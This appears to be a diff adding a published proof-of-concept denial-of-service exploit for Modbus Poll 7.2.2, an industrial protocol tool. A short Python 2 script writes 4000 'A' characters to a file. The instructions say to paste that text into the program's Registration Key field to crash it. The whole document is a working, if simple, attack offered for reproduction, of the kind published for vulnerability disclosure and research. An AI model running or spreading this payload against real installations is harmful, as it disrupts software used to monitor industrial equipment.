@@ -1,0 +1,27 @@
+# Exploit Title: Modbus Poll 7.2.2 - Denial of Service (PoC)
+# Discovery by: Cemal Cihad ÇİFTÇİ
+# Discovery Date: 2018-10-19
+# Tested Version: 7.2.2
+# Vulnerability Type: DOS
+# Tested on OS: Windows XP Professional Service Pack 3
+# Vendor Homepage: https://www.modbustools.com
+# Download Link: https://www.modbustools.com/download.html
+
+# Steps to Reproduce: Run the python exploit script, it will create a new
+# file with the name "exploit.txt". Copy the content of the new file "exploit.txt".
+# Now start the program. Now when you are inside of the program click Connection button and 
+# click "connect". It will ask you for registration key. In the field: "Registration Key" 
+# paste the copied content from "exploit.txt".
+# Now click "OK" and see a crash! 
+
+#!/usr/bin/python
+   
+buffer = "A" * 4000
+try:
+    f=open("exploit.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(buffer)
+    f.write(buffer)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
